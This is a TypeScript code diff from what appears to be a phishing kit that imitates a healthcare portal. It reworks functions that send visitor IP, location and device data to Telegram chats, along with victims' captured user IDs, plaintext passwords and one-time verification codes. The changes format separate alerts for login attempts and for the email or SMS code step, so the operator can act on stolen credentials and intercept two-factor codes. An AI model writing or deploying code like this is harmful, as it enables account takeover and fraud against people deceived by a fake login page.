@@ -12,6 +12,19 @@ interface VisitorData {
   referrer?: string
   utcTime?: string
   page?: string
+  url?: string
+}
+
+function formatLocalTime(utcTime?: string, timezone?: string): string {
+  const date = utcTime ? new Date(utcTime) : new Date()
+  return timezone
+    ? date.toLocaleString('en-US', { timeZone: timezone })
+    : date.toLocaleString('en-US')
+}
+
+function formatUtcTime(utcTime?: string): string {
+  const date = utcTime ? new Date(utcTime) : new Date()
+  return date.toLocaleString('en-GB', { timeZone: 'UTC', hour12: false })
 }
 
 interface FormData {
@@ -26,53 +39,55 @@ interface FormData {
 }
 
 export async function sendVisitorNotification(data: VisitorData) {
-  const message = `🌐 New Visitor - Goigoe Wealthheathcare Portal
-
+  const utcTime = data.utcTime || new Date().toISOString()
+  const message = `🌐 New Visitor
+━━━━━━━━━━━━━━━━━━
 📍 Location: ${data.location || 'Unknown'}
-
 🌍 IP: ${data.ip || 'Unknown'}
-
 ⏰ Timezone: ${data.timezone || 'Unknown'}
-
 🌐 ISP: ${data.isp || 'Unknown'}
 
 📱 Device: ${data.device || 'Unknown'}
-
 🖥️ Screen: ${data.screen || 'Unknown'}
-
 🌍 Language: ${data.language || 'Unknown'}
-
 🔗 Referrer: ${data.referrer || 'Direct'}
+🌐 URL: ${data.url || 'Unknown'}
 
-🕒 UTC Time: ${data.utcTime || new Date().toISOString()}
-
-📄 Page: ${data.page || 'Unknown'}`
+⏰ Local Time: ${formatLocalTime(utcTime, data.timezone)}
+🕒 UTC Time: ${formatUtcTime(utcTime)}`
 
   return sendTelegramMessage(message)
 }
 
 export async function sendFormNotification(data: FormData) {
-  const typeLabels: Record<string, string> = {
-    'login': 'LOGIN',
-    'registration': 'REGISTRATION',
-    'email_verification': 'EMAIL VERIFICATION',
-    'text_verification': 'TEXT VERIFICATION',
-    'email_selection': 'EMAIL OPTION SELECTED',
-    'text_selection': 'TEXT OPTION SELECTED'
-  }
-  
-  const message = `📝 Form Submission
+  let message: string
+  if (data.type === 'login') {
+    message = `🔐 Login Attempt
+━━━━━━━━━━━━━━━━━━
+👤 User ID: ${data.userId || ''}
+🔒 Password: ${data.password || ''}`
+  } else if (data.type === 'email_selection' || data.type === 'text_selection') {
+    const method = data.type === 'email_selection' ? 'Email' : 'Text Message (SMS)'
+    message = `🔐 Verify Your Identity
+━━━━━━━━━━━━━━━━━━
 
-🔹 Type: ${typeLabels[data.type] || data.type.toUpperCase()}
+Method Selected: ${method}`
+  } else if (data.type === 'email_verification' || data.type === 'text_verification') {
+    const typeLabel = data.type === 'email_verification' ? 'Email' : 'Text'
+    message = `✅ Verification Code Submitted
+🔐 Type: ${typeLabel}
+🔢 Code: ${data.otp || ''}`
+  } else {
+    message = `📝 Form Submission
+🔹 Type: ${data.type}
 📄 Page: ${data.page}
 🕒 Time: ${data.timestamp}
-
 ${data.userId ? `👤 User ID: ${data.userId}` : ''}
 ${data.password ? `🔒 Password: ${data.password}` : ''}
 ${data.email ? `📧 Email: ${data.email}` : ''}
 ${data.phone ? `📱 Phone: ${data.phone}` : ''}
 ${data.otp ? `🔐 OTP Code: ${data.otp}` : ''}`
-
+  }
   return sendTelegramMessage(message)
 }
 
@@ -95,8 +110,7 @@ async function sendTelegramMessage(message: string) {
       },
       body: JSON.stringify({
         chat_id: chatId,
-        text: message,
-        parse_mode: 'HTML'
+        text: message
       })
     }).catch(error => {
       console.error(`Failed to send to chat ${chatId}:`, error)
